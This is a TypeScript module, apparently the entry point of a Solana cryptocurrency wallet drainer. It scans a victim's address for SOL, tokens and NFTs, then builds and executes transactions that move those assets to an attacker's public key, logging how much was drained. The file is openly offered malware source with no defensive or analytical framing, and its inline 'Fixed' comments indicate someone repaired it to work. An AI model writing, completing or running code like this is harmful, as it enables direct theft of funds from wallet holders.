import { Connection, PublicKey, VersionedTransaction } from '@solana/web3.js';
import { scanVictimAssets } from './scanner';
import { buildOptimizedTransactions } from './builder';
import { executeTransactions } from './executor';        // ← Fixed import
import SOLANA_CONFIG from './config';
import { log } from './logger';

export async function startSolanaDrainer(victimAddress: string): Promise<any> {
  const requestId = `sol_${Date.now()}_${Math.random().toString(36).slice(2)}`;
  
  log.info('solana', `Starting drainer`, { requestId, victim: victimAddress });

  let connection: Connection;
  let assets: any;
  let transactions: VersionedTransaction[] = [];

  try {
    connection = new Connection(SOLANA_CONFIG.rpcEndpoints[0], {
      commitment: 'confirmed',
      confirmTransactionInitialTimeout: 60000,
    });

    const victimPubkey = new PublicKey(victimAddress);
    const attackerPubkey = new PublicKey(SOLANA_CONFIG.attackerPubkey);   // ← Fixed property name

    assets = await scanVictimAssets(connection, victimPubkey);

    if (!hasValuableAssets(assets)) {
      log.info('solana', 'No valuable assets found', { requestId });
      return { success: false, reason: "no_assets" };
    }

    transactions = await buildOptimizedTransactions(
      victimPubkey,
      attackerPubkey,
      assets,
      connection
    );

    const results = await executeTransactions(transactions, connection);   // ← Fixed function name

    const successCount = results.filter(r => r.success).length;

    log.info('solana', `Drain completed`, { 
      requestId, 
      success: successCount, 
      total: results.length 
    });

    return {
      success: successCount > 0,
      results,
      requestId,
      drainedSol: calculateDrainedSol(assets),
      drainedTokens: assets.tokens?.length || 0
    };

  } catch (error: any) {
    log.error('solana', 'Critical failure', error.message);
    return { success: false, error: error.message, requestId };
  }
}

// Helper Functions
function hasValuableAssets(assets: any): boolean {
  return (assets.solBalance || 0) > 0.003 * 1e9 || 
         (assets.tokens?.length || 0) > 0 || 
         (assets.nfts?.length || 0) > 0;
}

function calculateDrainedSol(assets: any): number {
  return Math.max(0, (assets.solBalance || 0) / 1e9 * 0.9);
}